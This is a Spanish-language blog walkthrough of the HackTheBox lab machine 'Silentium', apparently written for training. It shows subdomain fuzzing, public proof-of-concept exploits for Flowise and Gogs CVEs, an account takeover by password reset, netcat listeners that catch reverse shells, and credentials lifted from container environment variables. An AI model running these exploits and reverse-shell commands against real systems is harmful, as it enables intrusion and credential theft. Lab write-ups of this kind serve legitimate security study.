+++ 
draft = false
date = 2026-04-23T16:33:12+02:00
title = "Guía de Silentium en HackTheBox"
description = "Un tutorial para la máquina HTB \"Silentium\""
slug = ""
authors = ["Raul Bulgariu Suciu"]
tags = ["Tutorial", "Hacking", "HTB"]
categories = []
externalLink = ""
series = []
+++

{{<betterfigure src="./files/title.png" alt="">}}

Buenas noches, hoy vamos a abordar la máquina "Silentium" de HackTheBox.

# Reconocimiento básico

Como en muchas otras máquinas fáciles de Linux, un escaneo de puertos revelará servicios SSH y HTTP presentes dentro de la caja, y al intentar acceder al propio servicio HTTP podremos encontrar una página web estática-HTML:

{{<betterfigure src="./files/web.png" alt="">}}

Como probablemente ya estés pensando, no hay nada útil que podamos extraer de esta página, así que realizaremos un escaneo de subdominios usando el siguiente comando:

```bash
ffuf -r -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://silentium.htb -H "Host: FUZZ.silentium.htb" -p 0.1 -fs 8753
```

> `-fs 8753` especifica filtrar los tamaños de respuesta del número de conjunto, modificar el número para cualquier otro sitio web.

{{<betterfigure src="./files/subscan.png" alt="">}}

Como puedes ver, `staging.silentium.htb` es un dominio válido, así que podemos añadirlo a nuestro archivo `/etc/hosts` antes de acceder:

{{<betterfigure src="./files/staging.png" alt="">}}

El portal de inicio de sesión parece estar gestionado por un software llamado Flowise, aparte de eso no hay mucho más que podamos recopilar como la versión de este.

# Ganando un punto de apoyo

Como no pudimos encontrar ninguna información de versión sobre el portal de inicio de sesión, tenemos que buscar vulnerabilidades a ciegas; un buen punto de partida sería a través de `searchsploit`, como se puede ver en la siguiente captura de pantalla:

{{<betterfigure src="./files/searchsploit.png" alt="">}}

Aunque podemos usar los scripts proporcionados por `searchsploit`, en esta guía utilizaremos la [siguiente Prueba de Concepto](https://github.com/AzureADTrent/CVE-2025-58434-59528), **sin embargo, existe un problema con esta vulnerabilidad**.

Si te tomaste el tiempo de leer el informe de vulnerabilidad del repositorio, te darás cuenta de que este exploit requiere que el atacante conozca una cuenta de correo electrónico válida registrada dentro de la instancia de Flowise; podríamos intentar explotarlo mediante fuerza bruta, pero hay una solución mucho más sencilla oculta a simple vista:

{{<betterfigure src="./files/users.png" alt="">}}

Dentro de la página estática en HTML que visitamos antes, podemos encontrar una lista de empleados de alto perfil, con uno de ellos, "Ben", aparentemente con un rol relacionado a la administración de sistemas en la empresa.

Con esto, podemos intentar ejecutar el exploit bajo la suposición de que Ben registró su cuenta como `ben@silentium.htb`:

```bash
git clone https://github.com/AzureADTrent/CVE-2025-58434-59528
cd CVE-2025-58434-59528/
python3 flowise_chain.py -t http://staging.silentium.htb -e ben@silentium.htb 
```

El script nos informará que ha logrado cambiar la contraseña de la cuenta a `Pwn3d!2026`, y para continuar el script, tendremos que iniciar sesión manualmente y recuperar la clave API de la misma cuenta, así que volveremos a acceder a `staging.silentium.htb` y probaremos a iniciar sesión con las credenciales generadas:

{{<betterfigure src="./files/manualstep.png" alt="">}}

Como verás, hemos conseguido acceder a la cuenta del administrador, desde aquí tendremos que acceder al botón de configuración de la API resaltado:

{{<betterfigure src="./files/flowise.png" alt="">}}

Una vez dentro, copiaremos y pegaremos la clave API dentro del prompt de texto del script.

{{<betterfigure src="./files/apikey.png" alt="">}}

Junto con la clave API, también tendremos que proporcionar la IP y el puerto de escucha de nuestra máquina atacante, así que prepararemos en una terminal separada una shell inversa con el siguiente comando:

```bash
nc -lvnp 1337
```

{{<betterfigure src="./files/flowisexploit.png" alt="">}}

Una vez ejecutado el exploit, veremos que efectivamente hemos accedido a la máquina gracias a la shell inversa, sin embargo, al observarlo más de cerca, **notarás que esta no es la máquina real, sino un contenedor Docker**, como lo demuestra la existencia del archivo `.dockerenv` en la raíz del sistema de archivos.

{{<betterfigure src="./files/revshell.png" alt="">}}

A pesar de ello, los contenedores Docker tienden a almacenar información sensible que podemos aprovechar contra la máquina real, como por ejemplo credenciales dentro de variables de entorno:

{{<betterfigure src="./files/creds.png" alt="">}}

Por la captura de pantalla, podemos deducir que la contraseña censurada también podría pertenecer a Ben, así que podemos intentar usarla para iniciar sesión en el servidor SSH.

{{<betterfigure src="./files/user.png" alt="">}}

Finalmente, gracias a las credenciales, conseguimos recuperar la bandera `user.txt` de la máquina.

# Escalada de privilegios

Una vez dentro de la máquina, podemos empezar a buscar posibles vulnerabilidades para escalar nuestros privilegios; si buscas lo suficiente, podrás ver la carpeta `/opt/gogs`, la cual pertenece a un servidor Git siendo ejecutado.

{{<betterfigure src="./files/gogsver.png" alt="">}}

Comprobando su ejecutable para la versión en ejecución, podemos buscar esta en cualquier motor de búsqueda y descubrir que **es vulnerable a [CVE-2025-8110](https://github.com/0dgt/CVE-2025-8110)**, sin embargo, el exploit requiere una cuenta accesible y probar las mismas credenciales usadas para Flowise no volverá a funcionar.

Para solucionar esto, usaremos el reenvío de puertos para acceder nosotros mismos a la instancia de Gogs y registrar una cuenta manualmente:

```bash
ssh ben@silentium.htb -L 3001:localhost:3001
```

{{<betterfigure src="./files/gogs.png" alt="">}}

Con la cuenta creada, ahora podemos abrir otro puerto con `nc -lvnp 1302` para recibir el reverse shell y ejecutar los siguientes comandos:

```bash
git clone https://github.com/0dgt/CVE-2025-8110
cd CVE-2025-8110/
python3 CVE-2025-8110.py -u http://localhost:3001 -lh 10.10.15.106 -lp 1302
```

{{<betterfigure src="./files/root.png" alt="">}}

Tras ejecutar el exploit, recibimos acceso a la cuenta `root` del servidor, completando así la máquina al recuperar la bandera `root.txt`.
